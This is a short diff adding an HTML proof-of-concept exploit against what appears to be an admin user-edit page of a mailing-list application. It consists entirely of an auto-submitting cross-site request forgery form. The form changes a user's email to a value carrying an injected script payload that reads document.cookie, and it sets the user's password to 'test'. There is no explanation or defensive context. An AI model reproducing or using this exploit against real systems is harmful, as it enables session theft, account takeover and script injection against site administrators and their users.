@@ -1,0 +1,45 @@
+&lt;form action=&quot;http://www.example.com/admin/?page=user&amp;start=0&amp;id=USER_ID&amp;find=&amp;sortby=&amp;sortorder=desc&amp;unconfirmed=0&amp;blacklisted=0&quot; method=&quot;post&quot; name=&quot;main&quot;
+enctype=&quot;multipart/form-data&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;formtoken&quot; value=&quot;123&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;list&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;USER_ID&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;returnpage&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;returnoption&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&#039;email2@example.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;confirmed&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;htmlemail&quot; value=&quot;123&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;rssfrequency&quot; value=&quot;2&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;test&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;disabled&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;extradata&quot; value=&quot;add&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;foreignkey&quot; value=&quot;forkey&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;change&quot; value=&quot;Save Changes&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
